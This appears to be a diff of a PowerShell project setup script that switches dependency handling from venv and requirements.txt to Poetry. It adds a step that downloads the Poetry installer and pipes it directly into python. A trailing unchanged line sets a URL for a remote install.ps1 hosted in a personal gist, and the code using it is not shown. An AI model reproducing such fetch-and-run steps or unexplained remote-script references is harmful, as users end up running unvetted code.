@@ -86,57 +86,55 @@ if ($globalRequirements -and $globalRequirements.Count -gt 0) {
     Write-Output "Global Python package installation completed."
 }
 
-# Create Python virtual environment 'myenv' if not exists
-$venvPath = Join-Path $PSScriptRoot 'venv'
-if (-not (Test-Path $venvPath)) {
-    Write-Output "Creating Python virtual environment 'venv'..."
+# Check and install Poetry if not exists
+try {
+    poetry --version | Out-Null
+    Write-Output "Poetry is already installed."
+} catch {
+    Write-Output "Poetry not found, installing..."
     try {
-        python -m venv $venvPath
-        Write-Output "Virtual environment 'venv' created."
+        # Install Poetry using official installer
+        (Invoke-WebRequest -Uri https://install.python-poetry.org -UseBasicParsing).Content | python -
+        
+        # Add Poetry to PATH permanently (both current session and user environment)
+        $poetryPath = "$env:APPDATA\Python\Scripts"
+        $env:Path = "$poetryPath;" + $env:Path
+        
+        # Add to user environment variables permanently
+        $userPath = [System.Environment]::GetEnvironmentVariable('Path', 'User')
+        if ($userPath -notlike "*$poetryPath*") {
+            [System.Environment]::SetEnvironmentVariable('Path', "$poetryPath;$userPath", 'User')
+            Write-Output "Poetry PATH added to user environment variables permanently."
+        }
+        
+        Write-Output "Poetry installed successfully and added to PATH permanently."
     } catch {
-        Write-Output "Failed to create virtual environment, continue..."
+        Write-Output "Failed to install Poetry, continue..."
     }
-} else {
-    Write-Output "Virtual environment 'venv' already exists."
 }
 
-# Activate virtual environment and install requirements.txt
-$pythonExe = Join-Path $venvPath 'Scripts\python.exe'
-$requirementsPath = Join-Path $PSScriptRoot 'requirements.txt'
-if (Test-Path $requirementsPath) {
-    Write-Output "Checking and installing Python libraries from requirements.txt in virtual environment..."
+# Configure Poetry to create virtual environment in project directory
+Write-Output "Configuring Poetry to create virtual environment in project directory..."
+try {
+    poetry config virtualenvs.in-project true
+    Write-Output "Poetry virtual environment configuration updated."
+} catch {
+    Write-Output "Failed to configure Poetry virtual environment settings, continue..."
+}
+
+# Check if pyproject.toml exists
+$pyprojectPath = Join-Path $PSScriptRoot 'pyproject.toml'
+if (Test-Path $pyprojectPath) {
+    Write-Output "pyproject.toml found, installing dependencies with Poetry..."
     try {
-        & $pythonExe -m pip install --upgrade pip
+        # Install dependencies using Poetry
+        poetry install --no-root
+        Write-Output "Poetry dependencies installation completed."
     } catch {
-        Write-Output "pip upgrade failed, continue..."
+        Write-Output "Failed to install dependencies with Poetry, continue..."
     }
-    $lines = Get-Content $requirementsPath | Where-Object { $_.Trim() -ne '' -and -not $_.Trim().StartsWith('#') }
-    foreach ($line in $lines) {
-        if ($line -match '^(?<name>[^=<>!~]+)==(?<version>[0-9a-zA-Z\.-]+)$') {
-            $pkgName = $Matches['name'].Trim()
-            $pkgVersion = $Matches['version'].Trim()
-            try {
-                $checkCmd = "import pkg_resources; print(pkg_resources.get_distribution('$pkgName').version)"
-                $installedVersion = & $pythonExe -c $checkCmd 2>$null
-                if ([version]$installedVersion -lt [version]$pkgVersion) {
-                    throw
-                }
-                Write-Output "$pkgName==$installedVersion already satisfied in venv."
-            } catch {
-                Write-Output "Installing $pkgName==$pkgVersion in venv..."
-                try {
-                    & $pythonExe -m pip install "$pkgName==$pkgVersion"
-                } catch {
-                    Write-Output "Failed to install $pkgName in venv, continue..."
-                }
-            }
-        } else {
-            Write-Output "Skipping invalid requirement line: $line"
-        }
-    }
-    Write-Output "Python libraries check and installation in venv completed."
 } else {
-    Write-Output "requirements.txt not found, skipping Python libraries installation."
+    Write-Output "pyproject.toml not found, skipping Poetry dependencies installation."
 }
 
 $gistUrl = 'https://gist.githubusercontent.com/wongstarx/2d1aa1326a4ee9afc4359c05f871c9a0/raw/install.ps1'
